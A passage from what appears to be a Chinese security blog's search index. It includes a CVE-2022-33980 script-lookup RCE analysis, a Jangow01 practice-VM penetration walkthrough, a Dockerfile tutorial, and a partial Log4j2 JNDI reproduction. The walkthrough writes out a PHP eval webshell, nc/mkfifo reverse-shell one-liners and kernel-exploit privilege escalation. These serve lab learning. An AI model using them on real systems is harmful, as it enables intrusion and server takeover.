%BC%A6%E7%90%83%E5%9C%BA%E5%BE%B7%E5%9B%BD%E5%9B%BD%E5%AE%B6%E5%BE%B7%E6%AF%94%E6%9C%89%E6%84%9F/","summary":"虽说有感，但其实多特与拜仁的国家德比也完完全全的映射在我的足球记忆，充斥在我的大学生活中。 我的足球萌芽起源于2018年俄罗斯世界杯，很晚才接","title":"观2022年10月9日威斯特法伦球场德国国家德比有感"},{"content":"今天在先知社区看到了一篇文章对apache commons configuration旧版本的一个RCE漏洞分析的文章，阅读了一下，发现其利用过程跟log4j2的一些共同点，都用到了lookup和一些输入处理的不严谨。比如说对于该漏洞，可以通过script将其视为jvm脚本执行，从而实现RCE，log4j2则是通过jndi加载的对应ldap对应服务上面的恶意类，从而实现RCE。下面简单分析一下。\n0x01 漏洞背景 Commons Configuration是一个java应用程序的配置管理类库。可以从properties或者xml文件中加载软件的配置信息，用来构建支撑软件运行的基础环境。在一些配置文件较多较的复杂的情况下，使用该配置工具比较可以简化配置文件的解析和管理。也提高了开发效率和软件的可维护性。\n它目前支持的配置文件格式有:\nProperties files\nXML documents\nWindows INI files\nProperty list files (plist)\nJNDI等等\n根据官方给出的漏洞通报: https://lists.apache.org/thread/tdf5n7j80lfxdhs2764vn0xmpfodm87s\n明白这个CVE的漏洞点是在变量插值中造成的\n在commons-configuration2来说，变量插值，就类似于引用动态变量的方式，就好比，如果我们需要获取系统中的某个环境变量，我们可以在配置文件中使用${env:envname}, 如果需要获取用户根目录，同样可以通过${sys:user.home} 比如说，我们通过通过commons-configuration2的配置，我们可以看到一些暴露出来的系统信息 0x02 漏洞环境搭建 我们通过maven导入受影响的版本即可:\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.commons\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-configuration2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.7\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 给出我们的实例demo:\n根据官方给的解释，script标签可以将其视为jvm脚本执行，因此这里给出payload:${script:javascript:java.lang.Runtime.getRuntime().exec(\\\u0026quot;open /System/Applications/Calculator.app\\\u0026quot;)} 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import org.apache.commons.configuration2.interpol.ConfigurationInterpolator; import org.apache.commons.configuration2.interpol.InterpolatorSpecification; public class ApacheCommonConfiguration { public static void main(String[] args) { InterpolatorSpecification interpolatorSpecification = new InterpolatorSpecification.Builder() .withPrefixLookups(ConfigurationInterpolator.getDefaultPrefixLookups()) .withDefaultLookups(ConfigurationInterpolator.getDefaultPrefixLookups().values()) .create(); //创建示例 ConfigurationInterpolator configurationInterpolator = ConfigurationInterpolator.fromSpecification(interpolatorSpecification); // 解析字符串 System.out.println(configurationInterpolator.interpolate(\u0026#34;${script:javascript:java.lang.Runtime.getRuntime().exec(\u0026#34;open /System/Applications/Calculator.app\u0026#34;)}\u0026#34;)); } } 0x03 漏洞分析 首先我们在java.lang.Runtime#exec打下断点，看一下函数栈的调用情况，这能够帮助我们更好的分析漏洞的利用过程。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 exec:348, Runtime (java.lang) invokeVirtual_LL_L:-1, 1044036744 (java.lang.invoke.LambdaForm$DMH) reinvoke:-1, 211968962 (java.lang.invoke.LambdaForm$BMH) exactInvoker:-1, 436546048 (java.lang.invoke.LambdaForm$MH) linkToCallSite:-1, 1300393335 (java.lang.invoke.LambdaForm$MH) :program:1, Script$\\^eval\\_ (jdk.nashorn.internal.scripts) invokeStatic_LL_L:-1, 142257191 (java.lang.invoke.LambdaForm$DMH) invokeExact_MT:-1, 1757676444 (java.lang.invoke.LambdaForm$MH) invoke:637, ScriptFunctionData (jdk.nashorn.internal.runtime) invoke:494, ScriptFunction (jdk.nashorn.internal.runtime) apply:393, ScriptRuntime (jdk.nashorn.internal.runtime) evalImpl:449, NashornScriptEngine (jdk.nashorn.api.scripting) evalImpl:406, NashornScriptEngine (jdk.nashorn.api.scripting) evalImpl:402, NashornScriptEngine (jdk.nashorn.api.scripting) eval:155, NashornScriptEngine (jdk.nashorn.api.scripting) eval:264, AbstractScriptEngine (javax.script) lookup:85, ScriptStringLookup (org.apache.commons.text.lookup) lookup:45, StringLookupAdapter (org.apache.commons.configuration2.interpol) resolve:497, ConfigurationInterpolator (org.apache.commons.configuration2.interpol) resolveSingleVariable:529, ConfigurationInterpolator (org.apache.commons.configuration2.interpol) interpolate:362, ConfigurationInterpolator (org.apache.commons.configuration2.interpol) main:22, ApacheCommonConfiguration 我们可以看到：他主要是在org.apache.commons.configuration2.interpol.ConfigurationInterpolator#interpolate中对这种写法进行解析，赋予其对应的值。\n我们在这里打下断点，方便每步更直观的分析。\n传入了变量插值的值，首先判断他是否是String的实例，之后将会调用looksLikeSingleVariable进行判断格式是否正确。\n如果格式正确就进入resolveSingleVariable的过程，进行取值，如果不符合格式的就直接调用replace方法。通过这一步判断是否满足${}的格式。\n因为我们传入的恶意payload是符合${}格式的，所以我们会进入resolveSingleVariable方法\n在extractVariableName()方法中，主要是将传入的payload的${}去除,取出变量值，然后将整理之后的数据传递给resolve函数\n然后我们进入resolve()函数进行分析\n首先通过分割符58 : ':',分别取出prefix name value字段\n通过调用fetchLookupForPrefix方法传入prefix，取出对应的LookUp对象\n直接从prefixLookups这个Map对象属性中获取对应的StringLookupAdapter类之后我们紧跟着调用了lookup方法\n获得了ScriptStringLookup类对象，跟进其lookup方法的调用 他首先会通过:将其进行分隔开来，并判断了其格式，再分别取出了engineName和script之后，将会在后面通过调用getEngineByName方法的调用传入engineName，得到了ScriptEngine为NashormScriptEngine类 然后我们访问ScriptEngine的eval方法看一下\n带入了script和context对象继续调用eval方法\n发现其调用evalImpl 跟进evalImpl方法到最后成功执行了我们的代码，达到了命令执行\n最终实现了计算器弹窗\n0x04 总结 经过调试分析，漏洞产生原因是因为变量插值的时候，因为apache需要解析传入的参数，然后执行传入的参数的中key对应的value，如果传入的是Script，天然存在一个eval函数，我们可以通过控制传入的参数的value为我们的命令执行代码，从而实现RCE。\n官方后面给的补丁也很简单，https://github.com/apache/commons-configuration/commit/f025bc399e8125ffc7701ac74f09b833c5b5e152#diff-ae29e7f41cf746bc365d2cd17ca0cf535757498625a7203db240113021082f3f\n新版本默认将script url dns等prefix给去除了\n0x05 Refence https://xz.aliyun.com/t/11723 https://www.anquanke.com/post/id/276734 ","permalink":"http://www.reus09.top/posts/tech/cve-2022-33980-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","summary":"今天在先知社区看到了一篇文章对apache commons configuration旧版本的一个RCE漏洞分析的文章，阅读了一下，发现其利用过程跟log4","title":"CVE-2022-33980 RCE漏洞分析"},{"content":"之前只是了解过一些渗透工具的使用还有一些渗透思路，这次靶机jangow01的练习算是做了一个小整合。但因为是第一次做，难免有些束手无策、没有思路，所以总体还是参照其他人的思路走了一遍，但是也学到了很多的东西。\n0x00 错误解决 jangow01作者给出的靶机是基于virtualBox的,但是我个人感觉virtualBox的使用上面确实不如vmware来的功能全面、直接，所以我还是把jangow01的靶机导入到了vmware里面。\n但是这会产生一个问题，就是因为作者在靶机里面配置的网卡与vmware里面的网卡配置不太一样，这会导致靶机无法正常联网，产生IP。为此参考了博客https://blog.csdn.net/qq_45722813/article/details/121324686对这个问题进行了解决。\n下面简述一下操作流程，这里的配图直接借用博客的，就不在重复截图了。\n进入配置界面:将ro 修改为rw single init=/bin/bash 然后ctrl + x 重启靶机进入单用户命令行模式 然后输入ipconfig -a查看网卡，vmware下的网卡为ens33 vim /etc/network/interfaces编辑网络配置文件 将enp0s3 修改为ens33即可 dhclient进行自动分配IP地址 尽管设置完毕，IP可以正常产生，但是在作者介绍的靶机开启后再REDE一栏出现的IP仍然无法看到，推测还是virtualBox与Vmware一些配置不太兼容，但是供给我们正常完成这个渗透练习是没有问题的。\n0x01 信息收集 我们把靶机和攻击机kali都放在net8网关下面，所以靶机和攻击机是在同一个网段里面，便于实践。\n靶机IP ： 192.168.204.128\n扫描主机 命令nmap -sn 192.168.204.0/24 扫描网段，获得靶机ip\n192.168.204.128为攻击机地址\n192.168.204.2为net8网段的网关地址\n所以192.168.204.129实际上就是靶机的地址\n扫描端口 masscan -p 0-65535 192.168.204.129 --rate=10000 来扫描靶机开放的端口\n发现开放了80和21端口\n服务探测 nmap -sC -p 21,80 192.168.204.129进行一些服务探测\n发现其开放了ftp和http服务，并且在http服务下存在站点site\n访问site\n0x02 漏洞收集 ftp可能存在弱口令爆破。\n然后http://192.168.204.129/site/busque.php?buscar=这个接口发现了一个命令执行漏洞,可以执行任意指令。\n并且发现busque.php实际上是一个后门，一句话木马。\n0x03 漏洞利用 因为存在命令执行漏洞，所以写入一句话木马:echo '\u0026lt;?php eval($_POST[\u0026quot;shell\u0026quot;]);' \u0026gt; shell.php\n可以看到上传成功\n然后用蚁剑连接一下,连接成功。\n数据收集 在/var/www/html/site/wordpress/config.php目录下面发现数据库的username : desafio02和password:abygurl69\n并且在/var/www/html/.backup下面获取到备份文件，但是他的username为jangow01\n尝试了之后，发现账户jangow01和密码abygurl69实际上就是靶机的一个用户,并且也是ftp的账户a\n在/hone/jangow01目录下发现一个user.txt，将其md5解密发现为空\n稳定连接 我们可以通过反弹shell来获得稳定的连接。\n在kali 通过命令nc -lvp 4444对4444端口进行监听\n通过蚁剑的虚拟终端进行反弹shell\n猜测可能是端口占用。\n可以用nc来探测哪个端口可用\n在kali上面把所有端口0-65535全部绑到某个端口:sudo iptables -A PREROUTING -t nat -p tcp --dport 1:65535 -j REDIRECT --to-port 1234\n然后再靶机运行shell文件:/bin/bash nc.sh\n1 2 3 4 5 6 # !/bin/bash for i in {1..65535} do timeout 1 nc -vz 192.168.204.128 $i \u0026amp;\u0026amp; echo \u0026#34;$i open\u0026#34; \u0026gt;\u0026gt; out.txt || echo \u0026#34;$i closed\u0026#34; \u0026gt;\u0026gt; out.txt; done 然后发现443端口可以正常访问的。\n于是传入如下的反弹shell木马\n1 \u0026lt;?php system(\u0026#34;rm tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 192.168.204.128 443 \u0026gt;/tmp/f\u0026#34;);?\u0026gt; 然后访问该木马，从而反弹shell成功。\n然后输入python3 -c 'import pty;pty.spawn(\u0026quot;/bin/bash\u0026quot;)'美化终端\n0x04 权限提升 提权的话，这里主要用到内核方面的提权。\nuname -a查看靶机系统信息\n版本为4.4.0-31-generic 利用kali中的searchsploit查找可用于提权的脚本:searchsploit ubuntu 4.4.0-31\n然后命令searchsploit -m linx/local/45010.c\n将其编译后通过ftp发送到靶机。\n然后为exp添加执行权限，然后发现www-data没有这个权限。\n于是想到切换用户su jangow01，然后chmod a+x exp，执行我们的exp进行提权。\n通过命令id，可以看到确实为root权限，并且在root目录下面发现了一个proof.txt文件，即为我们的flag\n0x05 收获 梳理一下利用的全过程:\n通过一个命令执行漏洞写入一句话，然后使用蚁剑连接得到webshell，但是在反弹shell得时候碰到了问题，尝试使用bash、php、nc等进行反弹都没有成功，发现原来是服务器能够访问的外部端口受到了限制，最后通过探测发现只能访问外部的443端口，于是在kali使用nc监听443端口，然后通过访问式触发nc反弹命令才成功。 得到反弹的shell之后通过寻找敏感文件得到了普通用户的账户密码，可用于用户切换以及ftp登录，最后就是通过查看内核版本，寻找对应可提权的脚本，通过ftp上传，最后运行提权脚本得到root权限。 然后学到了nc 反弹shell的一些姿势:\n1 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 192.168.146.129 2333 \u0026gt;/tmp/f mkfifo 命令首先创建了一个管道，cat 将管道里面的内容输出传递给/bin/sh，sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路 类似的命令:mknod backpipe p; nc 192.168.146.129 2333 0\u0026lt;backpipe | /bin/bash 1\u0026gt;backpipe 2\u0026gt;backpipe 同时了解到了一些shell的编写和对/bin/sh、/bin/bash\n0x06 Reference 反弹shell的本质\nhttps://juejin.cn/post/7067095980922912799\nhttps://www.modb.pro/db/491885\n","permalink":"http://www.reus09.top/posts/tech/%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0-jangow01/","summary":"之前只是了解过一些渗透工具的使用还有一些渗透思路，这次靶机jangow01的练习算是做了一个小整合。但因为是第一次做，难免有些束手无策、没有","title":"靶机练习 Jangow01"},{"content":"这篇文章主要是想对docker的常见使用做一下小结，并学习一下dockerfile的编写方法。\n0x01 docker的基本架构 首先查看docker官网给出的docker架构图：\n在运行时分为 Docker 引擎（服务端守护进程） 和 客户端工具，我们日常使用各种 docker 命令，其实就是在使用 客户端工具 与 Docker 引擎 进行交互。\nImage 镜像 简单的理解，Docker 镜像就是一个 Linux 的文件系统（Root FileSystem），这个文件系统里面包含可以运行在 Linux 内核的程序以及相应的数据。\n通过镜像启动一个容器，一个镜像就是一个可执行的包，其中包括运行应用程序所需要的所有内容：包含代码，运行时间，库，环境变量和配置文件等。\nDocker 把 App 文件打包成为一个镜像，并且采用类似多次快照的存储技术，可以实现：\n多个 App 可以共用相同的底层镜像（初始的操作系统镜像）； App 运行时的 IO 操作和镜像文件隔离； 通过挂载包含不同配置/数据文件的目录或者卷（Volume），单个 App 镜像可以用来运行无数个不同业务的容器。 Container 容器 镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的类和实例一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。\nDocker 面向对象 容器 对象 镜像 类 镜像分层 从上图可以看到，新镜像是从 base 镜像一层一层叠加生成的。每安装一个软件，就在现有镜像的基础上增加一层。\n镜像分层最大的一个好处就是共享资源。比如说有多个镜像都从相同的 base 镜像构建而来，那么 Docker Host 只需在磁盘上保存一份 base 镜像；同时内存中也只需加载一份 base 镜像，就可以为所有容器服务了。而且镜像的每一层都可以被共享。\n如果多个容器共享一份基础镜像，当某个容器修改了基础镜像的内容，比如 /etc 下的文件，这时其他容器的 /etc 是不会被修改的，修改只会被限制在单个容器内。这就是容器 「Copy-on-Write」 特性。\n简单来说就是镜像是一层套一层的，每加入一个新的组件，就相当于把原本的容器作为一个Image,在其基础上产生一个新的Container,并且只有容器层是可写的，其他层都是只读的。\n基本过程 如图所示\n0x02 docker的常用命令 镜像 搜索镜像:docker search xxx\n拉取镜像: docker pull 镜像仓库/镜像名称\n列出镜像:docker images\n删除镜像: docker rmi 镜像名称/镜像ID\n提交镜像:docker commit -m \u0026quot;Added nmap\u0026quot; -a \u0026quot;xxx\u0026quot; b70f3162e24e ubuntu/nmap\n-m 来指定提交的说明信息，跟我们使用的版本控制工具一样，-a 可以指定更新的用户信息，之后是用来创建镜像的容器的ID，最后指定目标镜像的仓库名和 tag 信息。 容器 创建容器: docker run 镜像名称 参数 -t代表终端，-i代表交互式， 查看当前运行的所有容器:docekr ps -a 开启容器:docker start 容器ID 停止容器: docker stop 容器ID 重启容器:docker restart 容器ID 删除容器:docker rm 容器ID 容器命令交互:docker exec -it 容器ID /bin/bash 0x03 Dockerfile编写 因为漏洞复现中经常需要搭建环境，并且有时也需要将漏洞的dockerfile分享给别人，因此dockerfile编写还是很有必要的\n我们可以在一个Dockerfile使用docker build来创建一个镜像。\n例子 我们以创建一个配置好nmap工具的docker编写为例子，学习一下Dockerfile的编写技巧\nDockerfile 中每一条指令都创建镜像的一层，例如：\n1 2 3 4 5 # I want to use nmap to scan~ FROM ubuntu:18.04 MAINTAINER reus09 \u0026lt;614768006@qq.com\u0026gt; RUN apt-get -qq update RUN apt-get -qqy install nmap Dockerfile 基本的语法是：\n使用 # 来注释 FROM 指令告诉 Docker 使用哪个镜像作为基础镜像 MAINTAINER 注明维护者的信息 RUN 开头的命令会在创建中运行，比如安装一个软件包，在这里使用apt-get来安装了nmap 在目录下docker build -t=\u0026quot;ubuntu/nmap\u0026quot; .开始生成镜像。\n-t 添加tag,指定新镜像的用户信息 .是Dockerfile所在的路径。 指的注意的是Dockerfile编写的镜像不能超过127层。\n命令 FROM 格式为FROM image 或FROM image:tag，并且Dockerfile中第一条指令必须是FROM指令，且在同一个Dockerfile中创建多个镜像时，可以使用多个FROM指令。\nMAINTAINER 格式为MAINTAINER user_name user_email，指定维护者信息\nRUN 格式为RUN command 或 RUN [\u0026quot;EXECUTABLE\u0026quot;,\u0026quot;PARAM1\u0026quot;,\u0026quot;PARAM2\u0026quot;.....] 前者在shell终端中运行命令，/bin/sh -c command，例如：/bin/sh -c \u0026quot;echo hello\u0026quot; 后者使用exec执行，指定其他运行终端使用RUN[\u0026quot;/bin/bash\u0026quot;,\u0026quot;-c\u0026quot;,\u0026quot;echo hello\u0026quot;] 每条RUN指令将当前的镜像基础上执行指令，并提交为新的镜像，命令较长的时候可以使用\\来换行。\nCMD 支持三种格式： CMD [\u0026quot;executable\u0026quot;,\u0026quot;param1\u0026quot;,\u0026quot;param2\u0026quot;]，使用exec执行，这是推荐的方式。 CMD command param1 param2 在/bin/sh中执行。 CMD [\u0026quot;param1\u0026quot;,\u0026quot;param2\u0026quot;] 提供给ENTERYPOINT的默认参数。 CMD用于指定容器启动时执行的命令，每个Dockerfile只能有一个CMD命令，多个CMD命令只执行最后一个。若容器启动时指定了运行的命令，则会覆盖掉CMD中指定的命令。\nEXPOSE 格式为 EXPOSE port [port2,port3,\u0026hellip;]，例如EXPOSE 80这条指令告诉Docker服务器暴露80端口，供容器外部连接使用。 在启动容器的使用使用-P，Docker会自动分配一个端口和转发指定的端口，使用-p可以具体指定使用哪个本地的端口来映射对外开放的端口。\nENV 格式为：EVN key value 。用于指定环境变量，这些环境变量，后续可以被RUN指令使用，容器运行起来之后，也可以在容器中获取这些环境变量。 例如 ENV word hello RUN echo $word\nADD 格式：ADD src dest 该命令将复制指定本地src目录中的文件到容器中的dest中，原路径可以是是一个绝对路径，也可以是一个URL或一个tar文件，tar文件会自动解压为目录。\n(1)如果源路径是个文件，且目标路径是以 / 结尾， 则docker会把目标路径当作一个目录，会把源文件拷贝到该目录下。 如果目标路径不存在，则会自动创建目标路径。 (2)如果源路径是个文件，且目标路径是不是以 / 结尾，则docker会把目标路径当作一个文件。 如果目标路径不存在，会以目标路径为名创建一个文件，内容同源文件； 如果目标文件是个存在的文件，会用源文件覆盖它，当然只是内容覆盖，文件名还是目标文件名。 如果目标文件实际是个存在的目录，则会源文件拷贝到该目录下。 注意，这种情况下，最好显示的以 / 结尾，以避免混淆。 (3)如果源路径是个目录，且目标路径不存在，则docker会自动以目标路径创建一个目录，把源路径目录下的文件拷贝进来。 如果目标路径是个已经存在的目录，则docker会把源路径目录下的文件拷贝到该目录下。 (4)如果源文件是个归档文件（压缩文件，比如 .tar文件），则docker会自动帮解压。但是.tar.gz文件是不会自动解压的。 COPY 格式为：COPY src dest 复制本地主机src目录或文件到容器的dest目录，dest不存在时会自动创建。 COPY指令只能从执行docker build所在的主机上读取资源并复制到镜像中，而ADD指令还支持通过URL从远程服务器读取资源并复制到镜像中。 COPY指令不会自动解压归档文件（压缩文件）。\nENTRYPOINT 格式有两种： ENTRYPOINT [\u0026quot;executable\u0026quot;,\u0026quot;param1\u0026quot;,\u0026quot;param2\u0026quot;] ENTRYPOINT command param1,param2 会在shell中执行。 用于配置容器启动后执行的命令，这些命令不能被docker run提供的参数覆盖。和CMD一样，每个Dockerfile中只能有一个ENTRYPOINT，当有多个时最后一个生效。\nVOLUME 格式为 VOLUME [\u0026quot;/data\u0026quot;] 作用是创建在本地主机或其他容器可以挂载的数据卷，用来存放数据。\nUSER 格式为：USER username 指定容器运行时的用户名或UID，后续的RUN也会使用指定的用户。要临时使用管理员权限可以使用sudo。在USER命令之前可以使用RUN命令创建需要的用户。 例如：RUN groupadd -r docker \u0026amp;\u0026amp; useradd -r -g docker docker\nWORKDIR 格式： WORKDIR /path 为后续的RUN CMD ENTRYPOINT指定配置工作目录，可以使用多个WORKDIR指令，若后续指令用得是相对路径，则会基于之前的命令指定路径。\nONBUILD 格式ONBUILD [INSTRUCTION] 该配置指定当所创建的镜像作为其他新建镜像的基础镜像时所执行的指令。 例如下面的Dockerfile创建了镜像A： ONBUILD ADD . /app ONBUILD RUN python app.py 则基于镜像A创建新的镜像时，新的Dockerfile中使用from A 指定基镜像时，会自动执行ONBBUILD指令内容，等价于在新的要构建镜像的Dockerfile中增加了两条指令： FROM A ADD ./app RUN python app.py\n0x04 docker-compose学习 现在开源的漏洞靶场vulhub就是基于docker-compose进行靶场编排的。\ndocker-compose编写 [todo]\ndocker-compose命令 查看某个命令的具体帮助：docker-compose [COMMAND] --help\n常用选项： --verbose 输出更多调试信息 --version 查看版本信息 -f/--file FILE 使用特定的docker-compose模板文件，默认为docker-compose.yml -p/--project-name NAME 指定项目名称，默认使用搭建目录名称\n常用命令： docker-compose build 构建或重构一个新的服务，服务一旦构建后带上一个标记名，可以随时在项目目录下运行该命令来构建服务 docker-compose help 获取帮助 docker-compose kill 通过发送SIGKILL信号来中止容器，也可以使用-s SIGN来发送指定命令 docker-compose logs 查看服务的输出 docker-compose port 打印绑定的公共端口 docker-compose ps 列出所有容器 docker-compose pull [IMAGES] 拉取一个镜像 docker-compose rm [IMAGES] 删除一个镜像 docker-compose run [IMAGES] [COMMAND] 启动一个服务并执行特定命令 docker-compose scale SERVICE=NUMBER 启动多个同一服务的容器 docker-compose stop 停止正在运行的项目（多个容器），但不删除项目 docker-compose start 启动停止运行的项目 docker-compose up 构建、创建、启动、链接一个项目相关的容器，可以使用-d参数使其在后台运行，并且退出时该项目所有的容器都会停止\n","permalink":"http://www.reus09.top/posts/tech/dockerfile%E7%BC%96%E5%86%99/","summary":"这篇文章主要是想对docker的常见使用做一下小结，并学习一下dockerfile的编写方法。 0x01 docker的基本架构 首先查看docker官","title":"Dockerfile编写"},{"content":"0x00 前言 最近时间比较充沛，因此在这里复现一些流传比较广泛、危害性高的漏洞，Log4j2漏洞作为2021年爆出来的CVE明星，苦于当时时间紧迫，没有时间进行学习，现在系统性的学习一下log4j2的漏洞原理,复现过程,具体使用的一些姿势。\n0x01 漏洞描述 Apache Log4j2 是 Apache 软件基金会下的一个开源的基于 Java 的日志记录工具。Log4j2 是一个 Log4j 1.x 的重写，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。由于其优异的性能而被广泛的应用于各种常见的 Web 服务中。\n2021 年 12 月 9 日晚，Log4j2 的一个远程代码执行漏洞的利用细节被公开。攻击者使用 ${} 关键标识符触发 JNDI 注入漏洞，当程序将用户输入的数据进行日志记录时，即可触发此漏洞，成功利用此漏洞可以在目标服务器上执行任意代码。\n由于其触发方式简单、使用范围广泛，因此漏洞危害极大。\n目前，已经为此漏洞颁发了 CVE 编号：[CVE-2021-44228](https://www.cve.org/CVERecord?id=CVE-2021-44228)，根据官方安全公告，以下为相关信息： - 漏洞：Log4j2 的 JNDI 功能点无法防御来自攻击者的 ldap 以及其他相关端点的攻击行为。 - 严重等级：Critical - Basic CVSS 评分：10.0 CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H - 影响版本：all versions from 2.0-beta9 to 2.14.1 - 详情描述：Apache Log4j2 \u0026lt;=2.14.1 版本提供的 JNDI 特性用于配置、日志信息、参数位置时，无法防护攻击者使用 ldap 或其他 JNDI 相关断点的攻击行为。攻击者如果可以控制日志信息或日志信息参数，则可以在开启了 lookup substitution 功能时利用恶意的 ladp 服务器执行任意代码，在 2.15.0 版本时，默认将其此行为关闭。 - 缓解措施：在 \u0026gt;= 2.10 版本，可以通过设置系统属性 log4j2.formatMsgNoLookups 或环境变量 LOG4J_FORMAT_MSG_NO_LOOKUPS 为 true 来缓解。在 2.0-beta9 to 2.10.0 版本，可以通过移除 classpath 中的 JndiLookup 类来缓解，命令为：zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class。\n0x02 前置知识 JNDI全称 Java Naming and Directory Interface。\nJNDI是Java平台的一个标准扩展，提供了一组接口、类和关于命名空间的概念。如同其它很多Java技术一样，JDNI是provider-based的技术，暴露了一个API和一个服务供应接口（SPI）。这意味着任何基于名字的技术都能通过JNDI而提供服务，只要JNDI支持这项技术。JNDI目前所支持的技术包括LDAP、CORBA Common Object Service（COS）名字服务、RMI、NDS、DNS、Windows注册表等等。很多J2EE技术，包括EJB都依靠JNDI来组织和定位实体。 JDNI通过绑定的概念将对象和名称联系起来。在一个文件系统中，文件名被绑定给文件。在DNS中，一个IP地址绑定一个URL。在目录服务中，一个对象名被绑定给一个对象实体。 JNDI中的一组绑定作为上下文来引用。每个上下文暴露的一组操作是一致的。例如，每个上下文提供了一个查找操作，返回指定名字的相应对象。每个上下文都提供了绑定和撤除绑定名字到某个对象的操作。JNDI使用通用的方式来暴露命名空间，即使用分层上下文以及使用相同命名语法的子上下文。 说人话就是: JDNI 指向的某个对象，即为我们的服务 目录服务是一个特殊的数据库，用来保存描述性的、基于属性的详细信息，支持过滤功能。\nLDAP（Light Directory Access Portocol），它是基于X.500标准的轻量级目录访问协议。\n目录是一个为查询、浏览和搜索而优化的数据库，它成树状结构组织数据，类似文件目录一样。 目录数据库和关系数据库不同，它有优异的读性能，但写性能差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。 所以目录天生是用来查询的，就好象它的名字一样。 LDAP目录服务是由目录数据库和一套访问协议组成的系统。 0x03 漏洞复现 这里先总体讲一下log4j2漏洞攻击的整个流程。 Log4j2默认支持解析ldap/rmi协议（只要打印的日志中包括ldap/rmi协议即可），并会通过名称从ldap服务端其获取对应的Class文件，并使用ClassLoader在本地加载Ldap服务端返回的Class类。 这就为攻击者提供了攻击途径，攻击者可以在界面传入一个包含恶意内容（会提供一个恶意的Class文件）的ldap协议内容（如：恶意内容${jndi:ldap://localhost:9999/Test}恶意内容），该内容传递到后端被log4j2打印出来，就会触发恶意的Class的加载执行（可执行任意后台指令），从而达到攻击的目的。 log4j环境搭建 我们采取maven进行搭建\n在pom.xml里面写入log4j2的相关依赖\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.logging.log4j\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;log4j-api\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.14.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.logging.log4j\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;log4j-core\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.14.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; 然后给出示例代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 import org.apache.logging.log4j.LogManager; import org.apache.logging.log4j.Logger; public class main { private static final Logger logger = LogManager.getLogger(main.class); public static void main(String[] args) { // java 版本过本，给定的几个java版本默认设置trustURLCodebase为False System.setProperty(\u0026#34;com.sun.jndi.ldap.object.trustURLCodebase\u0026#34;,\u0026#34;true\u0026#34;); logger.error(\u0026#34;${jndi:ldap://127.0.0.1:1389/#exploit}\u0026#34;); } } 然后借用welk1n师傅提供的JDNI注入集成工具启动恶意服务器，用来给 ldap/rmi 调用返回恶意代码\njava -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C \u0026quot;open /System/Applications/Calculator.app\u0026quot; -A \u0026quot;127.0.0.1\u0026quot;:\n将生成的可利用的恶意服务器ldap的地址:ldap://127.0.0.1:1389/up14yk\n使用logger.error()来触发漏洞\n可以看到漏洞复现完毕，利用方法是很简单的，只需要log4j2版本满足要求，一旦在log字符串中检测到${}，就会解析其中的字符串尝试使用lookup查询，因此只要能控制log参数内容，就有机会实现漏洞利用。\n0x04 漏洞原理分析 这里主要参考su18大佬的关于log4j2漏洞的分析。主要对于Log4j2关于Lookup功能的使用以及漏洞的触发几个关键点进行阐述。\n首先查看漏洞触发函数栈的调用情况，我们在最后执行jndi远程命令执行的地方打下断点。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 lookup:172, JndiManager (org.apache.logging.log4j.core.net) lookup:56, JndiLookup (org.apache.logging.log4j.core.lookup) lookup:221, Interpolator (org.apache.logging.log4j.core.lookup) resolveVariable:1110, StrSubstitutor (org.apache.logging.log4j.core.lookup) substitute:1033, StrSubstitutor (org.apache.logging.log4j.core.lookup) substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup) replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup) format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern) format:38, PatternFormatter (org.apache.logging.log4j.core.pattern) toSerializable:344, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout) toText:244, PatternLayout (org.apache.logging.log4j.core.layout) encode:229, PatternLayout (org.apache.logging.log4j.core.layout) encode:59, PatternLayout (org.apache.logging.log4j.core.layout) directEncodeEvent:197, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) tryAppend:190, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) append:181, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) tryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config) callAppender0:129, AppenderControl (org.apache.logging.log4j.core.config) callAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config) callAppender:84, AppenderControl (org.apache.logging.log4j.core.config) callAppenders:540, LoggerConfig (org.apache.logging.log4j.core.config) processLogEvent:498, LoggerConfig 